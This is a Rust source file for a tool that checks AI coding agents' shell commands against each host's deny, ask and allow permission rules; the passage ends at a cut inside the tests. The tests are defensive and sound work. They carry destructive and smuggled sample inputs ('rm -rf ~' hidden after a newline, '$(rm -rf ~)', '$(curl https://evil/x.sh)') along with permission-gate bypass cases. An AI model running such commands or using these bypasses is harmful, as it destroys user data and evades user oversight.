use super::constants::{
    CLAUDE_DIR, CURSOR_DIR, DROID_DIR, DROID_HOME_ENV, DROID_SETTINGS_FILE, GEMINI_DIR,
    SETTINGS_JSON, SETTINGS_LOCAL_JSON,
};
use super::init::resolve_claude_dir;
use crate::core::stream::exec_capture;
use crate::discover::lexer::{is_word_boundary_whitespace, split_for_permissions};
use serde_json::Value;
use std::path::PathBuf;

/// Verdict from checking a command against Claude Code's permission rules.
#[derive(Debug, PartialEq, Eq, Clone, Copy)]
pub enum PermissionVerdict {
    /// An explicit allow rule matched — safe to auto-allow.
    Allow,
    /// A deny rule matched — pass through to Claude Code's native deny handling.
    Deny,
    /// An ask rule matched — rewrite the command but let Claude Code prompt the user.
    Ask,
    /// No rule matched — default to ask (matches Claude Code's least-privilege default).
    Default,
}

/// Check `cmd` against Claude Code's deny/ask/allow permission rules.
///
/// Precedence: Deny > Ask > Allow > Default (ask).
/// Returns `Default` when no rules match — callers should treat this as ask
/// to match Claude Code's least-privilege default.
pub fn check_command(cmd: &str) -> PermissionVerdict {
    check_command_for(cmd, Host::Claude)
}

/// The agent host whose own permission settings should be consulted.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Host {
    Claude,
    Codex,
    Trae,
    Cursor,
    Gemini,
    Droid,
    Vibe,
}

pub fn check_command_for(cmd: &str, host: Host) -> PermissionVerdict {
    let (deny_rules, ask_rules, allow_rules) = load_rules_for(host);
    check_command_with_rules(cmd, &deny_rules, &ask_rules, &allow_rules)
}

/// Load `host`'s deny/ask/allow Bash rules from disk, doing the settings-file I/O
/// exactly once. Exposed so a caller that checks many commands against the same
/// host in a loop (e.g. `rtk discover` scanning thousands of transcript commands)
/// can load once up front and reuse `check_command_with_rules` per command instead
/// of going through `check_command_for` and re-reading every settings file from
/// disk on every single call.
pub(crate) fn load_rules_for(host: Host) -> (Vec<String>, Vec<String>, Vec<String>) {
    match host {
        Host::Claude => load_permission_rules(),
        Host::Cursor => load_cursor_rules(),
        Host::Gemini => load_gemini_rules(),
        Host::Droid => load_droid_rules(),
        // Hosts with no RTK-side rule source. Codex enforces its native
        // execution rules after updatedInput. Do not interpret these hosts'
        // rules as Claude Bash patterns or borrow another host's settings.
        // No RTK-side match means Default, not an explicit Allow.
        Host::Codex | Host::Trae | Host::Vibe => (Vec::new(), Vec::new(), Vec::new()),
    }
}

/// Internal implementation allowing tests to inject rules without file I/O.
pub(crate) fn check_command_with_rules(
    cmd: &str,
    deny_rules: &[String],
    ask_rules: &[String],
    allow_rules: &[String],
) -> PermissionVerdict {
    let segments = split_compound_command(cmd);

    // Deny takes highest priority and pre-empts every other construct.
    for segment in &segments {
        let segment = segment.trim();
        for pattern in deny_rules {
            if command_matches_pattern(segment, pattern)
                || command_matches_pattern(strip_grammar_residue(segment), pattern)
            {
                return PermissionVerdict::Deny;
            }
        }
    }

    // Can't decompose substitution / file-target redirects — never auto-allow.
    if crate::discover::lexer::contains_unattestable_construct(cmd) {
        return PermissionVerdict::Ask;
    }

    let mut any_ask = false;
    // Every non-empty segment must independently match an allow rule for the
    // compound command to receive Allow. See issue #1213: previously a single
    // matching segment escalated the entire chain to Allow, enabling bypass.
    let mut all_segments_allowed = true;
    let mut saw_segment = false;

    for segment in &segments {
        let segment = segment.trim();
        if segment.is_empty() {
            continue;
        }
        saw_segment = true;

        // Ask — if any segment matches an ask rule, the final verdict is Ask.
        if !any_ask {
            for pattern in ask_rules {
                if command_matches_pattern(segment, pattern)
                    || command_matches_pattern(strip_grammar_residue(segment), pattern)
                {
                    any_ask = true;
                    break;
                }
            }
        }

        // Allow — every non-empty segment must match an allow rule independently.
        // As soon as one segment fails to match, the entire chain loses Allow status.
        if all_segments_allowed {
            let matched = allow_rules
                .iter()
                .any(|pattern| command_matches_pattern(segment, pattern));
            if !matched {
                all_segments_allowed = false;
            }
        }
    }

    // Precedence: Deny > Ask > Allow > Default (ask).
    // Allow requires (1) at least one segment seen, (2) all segments matched, (3) non-empty rules.
    if any_ask {
        PermissionVerdict::Ask
    } else if saw_segment && all_segments_allowed && !allow_rules.is_empty() {
        PermissionVerdict::Allow
    } else {
        PermissionVerdict::Default
    }
}

/// Load deny, ask, and allow Bash rules from all Claude Code settings files.
///
/// Files read (in order, later files do not override earlier ones — all are merged):
/// 1. `$PROJECT_ROOT/.claude/settings.json`
/// 2. `$PROJECT_ROOT/.claude/settings.local.json`
/// 3. `~/.claude/settings.json`
/// 4. `~/.claude/settings.local.json`
///
/// Missing files and malformed JSON are silently skipped.
fn load_permission_rules() -> (Vec<String>, Vec<String>, Vec<String>) {
    let mut deny_rules = Vec::new();
    let mut ask_rules = Vec::new();
    let mut allow_rules = Vec::new();

    for path in get_settings_paths() {
        let Ok(content) = std::fs::read_to_string(&path) else {
            continue;
        };
        let Ok(json) = crate::core::utils::from_json_str::<Value>(&content) else {
            eprintln!(
                "[rtk] warning: failed to parse permissions from {}",
                path.display()
            );
            continue;
        };
        let Some(permissions) = json.get("permissions") else {
            continue;
        };

        append_bash_rules(permissions.get("deny"), &mut deny_rules);
        append_bash_rules(permissions.get("ask"), &mut ask_rules);
        append_bash_rules(permissions.get("allow"), &mut allow_rules);
    }

    (deny_rules, ask_rules, allow_rules)
}

/// Extract Bash-scoped patterns from a JSON array and append them to `target`.
///
/// Only rules with a `Bash(...)` prefix are kept. Non-Bash rules (e.g. `Read(...)`) are ignored.
fn append_bash_rules(rules_value: Option<&Value>, target: &mut Vec<String>) {
    let Some(arr) = rules_value.and_then(|v| v.as_array()) else {
        return;
    };
    for rule in arr {
        if let Some(s) = rule.as_str()
            && s.starts_with("Bash(")
        {
            target.push(extract_bash_pattern(s).to_string());
        }
    }
}

/// Return the ordered list of Claude Code settings file paths to check.
fn get_settings_paths() -> Vec<PathBuf> {
    get_settings_paths_from(find_project_root(), resolve_claude_dir().ok())
}

/// Assemble the settings paths for a project root and a resolved Claude config dir.
///
/// `claude_dir` is already resolved, so it honors `CLAUDE_CONFIG_DIR` when set.
fn get_settings_paths_from(
    project_root: Option<PathBuf>,
    claude_dir: Option<PathBuf>,
) -> Vec<PathBuf> {
    let mut paths = Vec::new();

    if let Some(root) = project_root {
        paths.push(root.join(CLAUDE_DIR).join(SETTINGS_JSON));
        paths.push(root.join(CLAUDE_DIR).join(SETTINGS_LOCAL_JSON));
    }
    if let Some(claude_dir) = claude_dir {
        paths.push(claude_dir.join(SETTINGS_JSON));
        paths.push(claude_dir.join(SETTINGS_LOCAL_JSON));
    }

    paths
}

fn read_json(path: &std::path::Path) -> Option<Value> {
    let content = std::fs::read_to_string(path).ok()?;
    match crate::core::utils::from_json_str::<Value>(&content) {
        Ok(v) => Some(v),
        Err(_) => {
            eprintln!(
                "[rtk] warning: failed to parse permissions from {}",
                path.display()
            );
            None
        }
    }
}

fn append_wrapped_rules(rules_value: Option<&Value>, prefixes: &[&str], target: &mut Vec<String>) {
    let Some(arr) = rules_value.and_then(|v| v.as_array()) else {
        return;
    };
    for rule in arr.iter().filter_map(|r| r.as_str()) {
        for pre in prefixes {
            let bare = &pre[..pre.len() - 1];
            if rule == bare {
                target.push("*".to_string());
                break;
            }
            if let Some(inner) = rule.strip_prefix(pre).and_then(|s| s.strip_suffix(')')) {
                target.push(inner.to_string());
                break;
            }
        }
    }
}

// Global config only. RTK auto-allows only the globally-trusted subset; anything
// else defers to the host, which applies its own project config and folder-trust.
// This keeps RTK's allow set a subset of the host's — never more permissive.
fn global_config(dir: &str, file: &str) -> Option<Value> {
    read_json(&dirs::home_dir()?.join(dir).join(file))
}

fn load_cursor_rules() -> (Vec<String>, Vec<String>, Vec<String>) {
    let mut deny = Vec::new();
    let mut allow = Vec::new();
    if let Some(perms) = global_config(CURSOR_DIR, "cli-config.json")
        .as_ref()
        .and_then(|j| j.get("permissions"))
    {
        append_wrapped_rules(perms.get("deny"), &["Shell("], &mut deny);
        append_wrapped_rules(perms.get("allow"), &["Shell("], &mut allow);
    }
    (deny, Vec::new(), allow)
}

// Gemini honors project `.gemini/settings.json` when the folder is trusted.
// folderTrust is off by default (folder trusted); when on, a folder is trusted
// only via GEMINI_CLI_TRUST_WORKSPACE here (dialog-only trust is treated as
// untrusted → global, which is safe: never more permissive than the host).
fn gemini_settings() -> Option<Value> {
    let global = global_config(GEMINI_DIR, SETTINGS_JSON);
    let trusted = std::env::var("GEMINI_CLI_TRUST_WORKSPACE").as_deref() == Ok("true")
        || !global
            .as_ref()
            .and_then(|j| {
                j.pointer("/security/folderTrust/enabled")
                    .and_then(Value::as_bool)
            })
            .unwrap_or(false);
    if trusted
        && let Some(root) = find_project_root()
        && let Some(v) = read_json(&root.join(GEMINI_DIR).join(SETTINGS_JSON))
    {
        return Some(v);
    }
    global
}

fn load_gemini_rules() -> (Vec<String>, Vec<String>, Vec<String>) {
    let mut ask = Vec::new();
    let mut allow = Vec::new();
    let shells = ["run_shell_command(", "ShellTool("];
    if let Some(tools) = gemini_settings().as_ref().and_then(|j| j.get("tools")) {
        append_wrapped_rules(tools.get("allowed"), &shells, &mut allow);
        append_wrapped_rules(tools.get("confirmationRequired"), &shells, &mut ask);
    }
    (Vec::new(), ask, allow)
}

// All four Droid settings scopes: user (honoring $FACTORY_HOME_OVERRIDE) and
// project `.factory/`, each with settings.json + settings.local.json
// (docs.factory.ai/cli/configuration/settings). Missing files are skipped.
fn droid_settings_scopes() -> Vec<Value> {
    let mut dirs_to_read = Vec::new();
    if let Some(home) = std::env::var_os(DROID_HOME_ENV)
        .filter(|value| !value.is_empty())
        .map(PathBuf::from)
        .or_else(dirs::home_dir)
    {
        dirs_to_read.push(home.join(DROID_DIR));
    }
    if let Some(root) = find_project_root() {
        dirs_to_read.push(root.join(DROID_DIR));
    }

    let mut scopes = Vec::new();
    for dir in dirs_to_read {
        for file in [DROID_SETTINGS_FILE, SETTINGS_LOCAL_JSON] {
            if let Some(v) = read_json(&dir.join(file)) {
                scopes.push(v);
            }
        }
    }
    scopes
}

/// Deny-only: `commandDenylist`/`commandBlocklist` → deny, so RTK steps aside
/// and Droid's native confirm/block fires on the original command (rewriting
/// first would dodge Droid's own pattern matching). Entries are unioned across
/// scopes — a spurious step-aside is safe, a missed entry reopens the dodge.
/// No allow rules: RTK never asserts a decision for a command it renames to
/// `rtk …`, and Droid's built-in defaults are not mirrored (they would drift).
fn load_droid_rules() -> (Vec<String>, Vec<String>, Vec<String>) {
    droid_rules_from_settings(&droid_settings_scopes())
}

pub(crate) fn droid_rules_from_settings(
    scopes: &[Value],
) -> (Vec<String>, Vec<String>, Vec<String>) {
    let mut deny = Vec::new();
    for settings in scopes {
        for key in ["commandBlocklist", "commandDenylist"] {
            let Some(arr) = settings.get(key).and_then(Value::as_array) else {
                continue;
            };
            deny.extend(
                arr.iter()
                    .filter_map(Value::as_str)
                    .map(str::trim)
                    .filter(|rule| !rule.is_empty())
                    .map(String::from),
            );
        }
    }
    (deny, Vec::new(), Vec::new())
}

/// Locate the project root by walking up from CWD looking for `.claude/`.
///
/// Falls back to `git rev-parse --show-toplevel` if not found via directory walk.
fn find_project_root() -> Option<PathBuf> {
    // Fast path: walk up CWD looking for .claude/ — no subprocess needed.
    let mut dir = std::env::current_dir().ok()?;
    loop {
        if dir.join(CLAUDE_DIR).exists() {
            return Some(dir);
        }
        if !dir.pop() {
            break;
        }
    }

    // Fallback: git (spawns a subprocess, slower but handles monorepo layouts).
    let mut cmd = std::process::Command::new("git");
    cmd.args(["rev-parse", "--show-toplevel"]);
    let result = exec_capture(&mut cmd).ok()?;

    if result.success() {
        return Some(PathBuf::from(result.stdout.trim()));
    }

    None
}

/// Extract the pattern string from inside `Bash(pattern)`.
///
/// Returns the original string unchanged if it does not match the expected format.
pub(crate) fn extract_bash_pattern(rule: &str) -> &str {
    if let Some(inner) = rule.strip_prefix("Bash(")
        && let Some(pattern) = inner.strip_suffix(')')
    {
        return pattern;
    }
    rule
}

/// Check if `cmd` matches a Claude Code permission pattern.
///
/// `split_for_permissions` does not treat `{`/`}` as boundaries, so
/// `... && { rm -rf / ; }` arrives as `{ rm -rf /` and no exact deny pattern
/// matches it.
///
/// Deny and ask only, never allow: stripping can only make a rule fire on more
/// segments, so a verdict can get stricter but never looser. On the allow side
/// it would let `{ ls` inherit an `ls` rule and turn a prompt into an
/// auto-approve.
fn strip_grammar_residue(segment: &str) -> &str {
    let mut rest = segment.trim();
    loop {
        // Only a standalone word is grammar. `!rm` is history expansion, not
        // negation, and `{foo` is a brace expansion, not a group.
        let stripped = match rest.split_once([' ', '\t']) {
            Some(("{" | "}" | "!" | "(" | ")", tail)) => tail,
            _ => return rest,
        };
        let next = stripped.trim_start();
        if next == rest {
            return rest;
        }
        rest = next;
    }
}

/// Pattern forms:
/// - `*` → matches everything
/// - `prefix:*` or `prefix *` (trailing `*`, no other wildcards) → prefix match with word boundary
/// - `* suffix`, `pre * suf` → glob matching where `*` matches any sequence of characters
/// - `pattern` → exact match or prefix match (cmd must equal pattern or start with `{pattern} `)
pub(crate) fn command_matches_pattern(cmd: &str, pattern: &str) -> bool {
    // Shares the lexer's word-boundary definition rather than
    // str::split_whitespace(), so a bare `\r` in `cmd` never collapses into a space.
    //
    // A line continuation is removed first: bash elides `\<newline>` entirely
    // and joins the words either side, so splitting on the newline alone would
    // leave a stray `\` in front of the command that no pattern matches.
    //
    // Only the LF form: against CRLF the backslash escapes the `\r` and the
    // `\n` still terminates the command, in bash and in the lexer alike, so
    // the words either side are already separate segments.
    let normalize = |s: &str| {
        s.replace("\\\n", "")
            .split(is_word_boundary_whitespace)
            .filter(|part| !part.is_empty())
            .collect::<Vec<_>>()
            .join(" ")
    };
    let cmd_norm = normalize(cmd);
    let pattern_norm = normalize(pattern);
    let cmd = cmd_norm.as_str();
    let pattern = pattern_norm.as_str();

    // 1. Global wildcard
    if pattern == "*" {
        return true;
    }

    // 2. Trailing-only wildcard: fast path with word-boundary preservation
    //    Handles: "git push*", "git push *", "sudo:*"
    if let Some(p) = pattern.strip_suffix('*') {
        let prefix = p.trim_end_matches(':').trim_end();
        // Bug 2 fix: after stripping, if prefix is empty or just wildcards, match everything
        if prefix.is_empty() || prefix == "*" {
            return true;
        }
        // No other wildcards in prefix -> use word-boundary fast path
        if !prefix.contains('*') {
            return cmd == prefix || cmd.starts_with(&format!("{} ", prefix));
        }
        // Prefix still contains '*' -> fall through to glob matching
    }

    // 3. Complex wildcards (leading, middle, multiple): glob matching
    if pattern.contains('*') {
        return glob_matches(cmd, pattern);
    }

    // 4. No wildcard: exact match or prefix with word boundary
    cmd == pattern || cmd.starts_with(&format!("{} ", pattern))
}

/// Glob-style matching where `*` matches any character sequence (including empty).
///
/// Colon syntax normalized: `sudo:*` treated as `sudo *` for word separation.
fn glob_matches(cmd: &str, pattern: &str) -> bool {
    // Normalize colon-wildcard syntax: "sudo:*" -> "sudo *", "*:rm" -> "* rm"
    let normalized = pattern.replace(":*", " *").replace("*:", "* ");
    let parts: Vec<&str> = normalized.split('*').collect();

    // All-stars pattern (e.g. "***") matches everything
    if parts.iter().all(|p| p.is_empty()) {
        return true;
    }

    let mut search_from = 0;

    for (i, part) in parts.iter().enumerate() {
        if part.is_empty() {
            continue;
        }

        if i == 0 {
            // First segment: must be prefix (pattern doesn't start with *)
            if !cmd.starts_with(part) {
                return false;
            }
            search_from = part.len();
        } else if i == parts.len() - 1 {
            // Last segment: must be suffix (pattern doesn't end with *)
            if !cmd[search_from..].ends_with(*part) {
                return false;
            }
        } else {
            // Middle segment: find next occurrence.
            // Also accept end-of-string when the segment ends with whitespace — this
            // handles commands that terminate at the middle token without trailing args,
            // e.g. "git -C * diff:*" should match bare "git -C /path diff" (#1105).
            let remaining = &cmd[search_from..];
            if let Some(pos) = remaining.find(*part) {
                search_from += pos + part.len();
            } else {
                let trimmed = part.trim_end();
                if !trimmed.is_empty() && remaining.ends_with(trimmed) {
                    search_from += remaining.len();
                } else {
                    return false;
                }
            }
        }
    }

    true
}

fn split_compound_command(cmd: &str) -> Vec<&str> {
    split_for_permissions(cmd)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_get_settings_paths_uses_the_resolved_claude_dir() {
        let project = PathBuf::from("/workspace/project");
        let profile = PathBuf::from("/profiles/work/.claude");

        let paths = get_settings_paths_from(Some(project.clone()), Some(profile.clone()));

        assert_eq!(
            paths,
            vec![
                project.join(CLAUDE_DIR).join(SETTINGS_JSON),
                project.join(CLAUDE_DIR).join(SETTINGS_LOCAL_JSON),
                profile.join(SETTINGS_JSON),
                profile.join(SETTINGS_LOCAL_JSON),
            ]
        );
    }

    #[test]
    fn test_get_settings_paths_without_a_claude_dir() {
        let project = PathBuf::from("/workspace/project");

        let paths = get_settings_paths_from(Some(project.clone()), None);

        assert_eq!(
            paths,
            vec![
                project.join(CLAUDE_DIR).join(SETTINGS_JSON),
                project.join(CLAUDE_DIR).join(SETTINGS_LOCAL_JSON),
            ]
        );
    }

    #[test]
    fn test_parse_bash_pattern() {
        assert_eq!(
            extract_bash_pattern("Bash(git push --force)"),
            "git push --force"
        );
        assert_eq!(extract_bash_pattern("Bash(*)"), "*");
        assert_eq!(extract_bash_pattern("Bash(sudo:*)"), "sudo:*");
        assert_eq!(extract_bash_pattern("Read(**/.env*)"), "Read(**/.env*)"); // unchanged
    }

    #[test]
    fn test_exact_match() {
        assert!(command_matches_pattern(
            "git push --force",
            "git push --force"
        ));
    }

    #[test]
    fn test_wildcard_colon() {
        assert!(command_matches_pattern("sudo rm -rf /", "sudo:*"));
    }

    #[test]
    fn test_no_match() {
        assert!(!command_matches_pattern("git status", "git push --force"));
    }

    #[test]
    fn test_deny_precedence_over_ask() {
        let deny = vec!["git push --force".to_string()];
        let ask = vec!["git push --force".to_string()];
        assert_eq!(
            check_command_with_rules("git push --force", &deny, &ask, &[]),
            PermissionVerdict::Deny
        );
    }

    #[test]
    fn test_non_bash_rules_ignored() {
        assert_eq!(extract_bash_pattern("Read(**/.env*)"), "Read(**/.env*)");

        // With empty rule sets, verdict is Default (not Allow).
        assert_eq!(
            check_command_with_rules("cat .env", &[], &[], &[]),
            PermissionVerdict::Default
        );
    }

    #[test]
    fn test_empty_permissions() {
        // No rules at all → Default (ask), not Allow.
        assert_eq!(
            check_command_with_rules("git push --force", &[], &[], &[]),
            PermissionVerdict::Default
        );
    }

    #[test]
    fn test_prefix_match() {
        assert!(command_matches_pattern(
            "git push --force origin main",
            "git push --force"
        ));
    }

    #[test]
    fn test_wildcard_all() {
        assert!(command_matches_pattern("anything at all", "*"));
        assert!(command_matches_pattern("", "*"));
    }

    #[test]
    fn test_no_partial_word_match() {
        // "git push --forceful" must NOT match pattern "git push --force".
        assert!(!command_matches_pattern(
            "git push --forceful",
            "git push --force"
        ));
    }

    #[test]
    fn test_extra_whitespace_still_matches() {
        assert!(command_matches_pattern("git  push", "git push"));
        assert!(command_matches_pattern("git\tpush origin", "git push"));
        assert!(command_matches_pattern(
            "git   push   --force",
            "git push --force"
        ));
    }

    #[test]
    fn test_extra_whitespace_deny_not_evaded() {
        let deny = vec!["git push".to_string()];
        assert_eq!(
            check_command_with_rules("git  push origin main", &deny, &[], &[]),
            PermissionVerdict::Deny
        );
    }

    #[test]
    fn test_extra_whitespace_preserves_word_boundary() {
        assert!(!command_matches_pattern(
            "git  push  --forceful",
            "git push --force"
        ));
        assert!(!command_matches_pattern("sudoedit /etc/hosts", "sudo:*"));
    }

    #[test]
    fn test_compound_command_deny() {
        let deny = vec!["git push --force".to_string()];
        assert_eq!(
            check_command_with_rules("git status && git push --force", &deny, &[], &[]),
            PermissionVerdict::Deny
        );
    }

    #[test]
    fn test_compound_command_ask() {
        let ask = vec!["git push".to_string()];
        assert_eq!(
            check_command_with_rules("git status && git push origin main", &[], &ask, &[]),
            PermissionVerdict::Ask
        );
    }

    #[test]
    fn test_compound_command_deny_overrides_ask() {
        let deny = vec!["git push --force".to_string()];
        let ask = vec!["git status".to_string()];
        assert_eq!(
            check_command_with_rules("git status && git push --force", &deny, &ask, &[]),
            PermissionVerdict::Deny
        );
    }

    #[test]
    fn test_quoted_operators_not_split() {
        // "&&" inside quotes must NOT cause a split — old naive splitter got this wrong
        let deny = vec!["git push --force".to_string()];
        assert_eq!(
            check_command_with_rules(r#"echo "git push --force && danger""#, &deny, &[], &[]),
            PermissionVerdict::Default
        );
    }

    #[test]
    fn test_pipe_segments_checked() {
        let deny = vec!["rm -rf".to_string()];
        assert_eq!(
            check_command_with_rules("cat file | rm -rf /", &deny, &[], &[]),
            PermissionVerdict::Deny
        );
    }

    #[test]
    fn test_stderr_pipe_segments_checked() {
        let deny = vec!["rm -rf".to_string()];
        assert_eq!(
            check_command_with_rules("cat file |& rm -rf /", &deny, &[], &[]),
            PermissionVerdict::Deny
        );
    }

    #[test]
    fn test_ask_verdict() {
        let ask = vec!["git push".to_string()];
        assert_eq!(
            check_command_with_rules("git push origin main", &[], &ask, &[]),
            PermissionVerdict::Ask
        );
    }

    #[test]
    fn test_sudo_wildcard_no_false_positive() {
        // "sudoedit" must NOT match "sudo:*" (word boundary respected).
        assert!(!command_matches_pattern("sudoedit /etc/hosts", "sudo:*"));
    }

    // Bug 2: *:* catch-all must match everything
    #[test]
    fn test_star_colon_star_matches_everything() {
        assert!(command_matches_pattern("rm -rf /", "*:*"));
        assert!(command_matches_pattern("git push --force", "*:*"));
        assert!(command_matches_pattern("anything", "*:*"));
    }

    // Bug 3: leading wildcard — positive
    #[test]
    fn test_leading_wildcard() {
        assert!(command_matches_pattern("git push --force", "* --force"));
        assert!(command_matches_pattern("npm run --force", "* --force"));
    }

    // Bug 3: leading wildcard — negative (suffix anchoring)
    #[test]
    fn test_leading_wildcard_no_partial() {
        assert!(!command_matches_pattern("git push --forceful", "* --force"));
        assert!(!command_matches_pattern("git push", "* --force"));
    }

    // Bug 3: middle wildcard — positive
    #[test]
    fn test_middle_wildcard() {
        assert!(command_matches_pattern("git push main", "git * main"));
        assert!(command_matches_pattern("git rebase main", "git * main"));
    }

    // Bug 3: middle wildcard — negative
    #[test]
    fn test_middle_wildcard_no_match() {
        assert!(!command_matches_pattern("git push develop", "git * main"));
    }

    // Bug 3: middle wildcard at end-of-command (no trailing args) — #1105
    #[test]
    fn test_middle_wildcard_at_end_of_command() {
        // "git -C * diff:*" should match bare "git -C /path diff" (no trailing flags)
        assert!(command_matches_pattern(
            "git -C /path diff",
            "git -C * diff:*"
        ));
        // Must still match when there ARE trailing args
        assert!(command_matches_pattern(
            "git -C /path diff --stat",
            "git -C * diff:*"
        ));
        // Must NOT match a different subcommand
        assert!(!command_matches_pattern(
            "git -C /path status",
            "git -C * diff:*"
        ));
    }

    // Bug 3: multiple wildcards
    #[test]
    fn test_multiple_wildcards() {
        assert!(command_matches_pattern(
            "git push --force origin main",
            "git * --force *"
        ));
        assert!(!command_matches_pattern(
            "git pull origin main",
            "git * --force *"
        ));
    }

    // Integration: deny with leading wildcard
    #[test]
    fn test_deny_with_leading_wildcard() {
        let deny = vec!["* --force".to_string()];
        assert_eq!(
            check_command_with_rules("git push --force", &deny, &[], &[]),
            PermissionVerdict::Deny
        );
        assert_eq!(
            check_command_with_rules("git push", &deny, &[], &[]),
            PermissionVerdict::Default
        );
    }

    // Integration: deny *:* blocks everything
    #[test]
    fn test_deny_star_colon_star() {
        let deny = vec!["*:*".to_string()];
        assert_eq!(
            check_command_with_rules("rm -rf /", &deny, &[], &[]),
            PermissionVerdict::Deny
        );
    }

    // --- Allow rules tests ---

    #[test]
    fn test_explicit_allow_rule() {
        let allow = vec!["git status".to_string()];
        assert_eq!(
            check_command_with_rules("git status", &[], &[], &allow),
            PermissionVerdict::Allow
        );
    }

    #[test]
    fn test_allow_wildcard() {
        let allow = vec!["git *".to_string()];
        assert_eq!(
            check_command_with_rules("git log --oneline", &[], &[], &allow),
            PermissionVerdict::Allow
        );
    }

    #[test]
    fn test_deny_overrides_allow() {
        let deny = vec!["git push --force".to_string()];
        let allow = vec!["git *".to_string()];
        assert_eq!(
            check_command_with_rules("git push --force", &deny, &[], &allow),
            PermissionVerdict::Deny
        );
    }

    #[test]
    fn test_ask_overrides_allow() {
        let ask = vec!["git push".to_string()];
        let allow = vec!["git *".to_string()];
        assert_eq!(
            check_command_with_rules("git push origin main", &[], &ask, &allow),
            PermissionVerdict::Ask
        );
    }

    #[test]
    fn test_no_rules_returns_default() {
        assert_eq!(
            check_command_with_rules("cargo test", &[], &[], &[]),
            PermissionVerdict::Default
        );
    }

    #[test]
    fn test_default_not_allow_when_unmatched() {
        // Commands not in any list should get Default, not Allow
        let allow = vec!["git *".to_string()];
        assert_eq!(
            check_command_with_rules("cargo build", &[], &[], &allow),
            PermissionVerdict::Default
        );
    }

    // --- Regression tests for #1213 ---
    // Compound command permission escalation: a single allowed segment must NOT
    // grant Allow to the entire chain. Every non-empty segment must match
    // independently.

    #[test]
    fn test_compound_allow_requires_every_segment() {
        // Reproduces #1213: `git status` is allowed but `git add .` is not.
        // Previously the chain was escalated to Allow — must now demote to Default.
        let allow = vec![
            "git status *".to_string(),
            "git status".to_string(),
            "cargo *".to_string(),
        ];

        // Single allowed command → Allow
        assert_eq!(
            check_command_with_rules("git status", &[], &[], &allow),
            PermissionVerdict::Allow
        );

        // Single unallowed command → Default
        assert_eq!(
            check_command_with_rules("git add .", &[], &[], &allow),
            PermissionVerdict::Default
        );

        // BUG #1213: chain with one allowed + one unallowed → must be Default
        assert_eq!(
            check_command_with_rules("git status && git add .", &[], &[], &allow),
            PermissionVerdict::Default,
            "allowed segment must not escalate unallowed segment"
        );

        // Three-segment chain with middle unallowed → Default
        assert_eq!(
            check_command_with_rules(
                "cargo test && git add . && git commit -m foo",
                &[],
                &[],
                &allow,
            ),
            PermissionVerdict::Default,
            "middle unallowed segment must demote the whole chain"
        );

        // Unallowed-then-allowed ordering must also demote
        assert_eq!(
            check_command_with_rules("git add . && git status", &[], &[], &allow),
            PermissionVerdict::Default,
            "unallowed first segment must demote the chain"
        );
    }

    #[test]
    fn test_compound_allow_all_segments_matched() {
        // All segments match → Allow (regression: wildcard allow still works)
        let allow = vec!["git *".to_string(), "cargo *".to_string()];

        assert_eq!(
            check_command_with_rules("git status && cargo test", &[], &[], &allow),
            PermissionVerdict::Allow
        );

        assert_eq!(
            check_command_with_rules(
                "git log --oneline && cargo build && git status",
                &[],
                &[],
                &allow
            ),
            PermissionVerdict::Allow
        );
    }

    #[test]
    fn test_compound_allow_semicolon_separator() {
        // `;` separator must be handled identically to `&&`.
        let allow = vec!["git status".to_string()];
        assert_eq!(
            check_command_with_rules("git status; git push", &[], &[], &allow),
            PermissionVerdict::Default
        );
    }

    #[test]
    fn test_compound_allow_pipe_separator() {
        // `|` separator must be handled identically to `&&`.
        let allow = vec!["git log".to_string()];
        assert_eq!(
            check_command_with_rules("git log | grep foo", &[], &[], &allow),
            PermissionVerdict::Default
        );
    }

    #[test]
    fn test_compound_allow_or_separator() {
        // `||` separator must also split segments.
        let allow = vec!["cargo build".to_string()];
        assert_eq!(
            check_command_with_rules("cargo build || cargo clean", &[], &[], &allow),
            PermissionVerdict::Default
        );
    }

    #[test]
    fn test_compound_ask_still_wins_over_partial_allow() {
        // If any segment hits an ask rule, verdict is Ask (ask > allow).
        let ask = vec!["git push".to_string()];
        let allow = vec!["git *".to_string()];
        assert_eq!(
            check_command_with_rules("git status && git push origin main", &[], &ask, &allow),
            PermissionVerdict::Ask
        );
    }

    // --- Permission-gate bypass hardening -----------------------------------

    #[test]
    fn test_newline_hidden_command_denied() {
        let deny = vec!["rm:*".to_string()];
        let allow = vec!["git *".to_string()];
        assert_eq!(
            check_command_with_rules("git status\nrm -rf ~", &deny, &[], &allow),
            PermissionVerdict::Deny
        );
    }

    #[test]
    fn test_newline_hidden_command_not_auto_allowed() {
        let allow = vec!["git *".to_string()];
        assert_eq!(
            check_command_with_rules("git status\nrm -rf ~", &[], &[], &allow),
            PermissionVerdict::Default
        );
    }

    #[test]
    fn test_lone_cr_hidden_command_not_auto_allowed() {
        let allow = vec!["git status".to_string()];
        assert_eq!(
            check_command_with_rules("git status\rrm -rf ~", &[], &[], &allow),
            PermissionVerdict::Default
        );
    }

    #[test]
    fn test_lone_cr_does_not_collapse_to_space_in_pattern_match() {
        assert!(!command_matches_pattern(
            "git status\rrm -rf ~",
            "git status"
        ));
    }

    #[test]
    fn test_lone_cr_segment_still_denied() {
        let deny = vec!["rm:*".to_string()];
        assert_eq!(
            check_command_with_rules("git status\rrm -rf ~", &deny, &[], &[]),
            PermissionVerdict::Deny
        );
    }

    #[test]
    fn test_background_hidden_command_denied() {
        let deny = vec!["rm:*".to_string()];
        let allow = vec!["git *".to_string()];
        assert_eq!(
            check_command_with_rules("git status & rm -rf ~", &deny, &[], &allow),
            PermissionVerdict::Deny
        );
    }

    #[test]
    fn test_substitution_never_auto_allowed() {
        let allow = vec!["git *".to_string()];
        for cmd in [
            "git log --pretty=$(rm -rf ~)",
            "git status `whoami`",
            "git diff $(curl https://evil/x.sh)",
        ] {
            assert_eq!(
                check_command_with_rules(cmd, &[], &[], &allow),
                PermissionVerdict::Ask,
                "{cmd} must not auto-allow"
            );
        }
    }

    #[test]
    fn test_double_quoted_substitution_never_auto_allowed() {
        let allow = vec!["git *".to_string()];
        for cmd in [
            r#"git log --pretty="$(rm -rf ~)""#,
            r#"git log --pretty="`rm -rf ~`""#,
        ] {
            assert_ne!(
                check_command_with_rules(cmd, &[], &[], &allow),
                PermissionVerdict::Allow,
                "{cmd} must not auto-allow"
            );
        }
    }

    #[test]
    fn test_single_quoted_substitution_is_literal() {
        let allow = vec!["echo *".to_string()];
        assert_eq!(
            check_command_with_rules("echo '$(rm -rf ~)'", &[], &[], &allow),
            PermissionVerdict::Allow
        );
    }

    #[test]
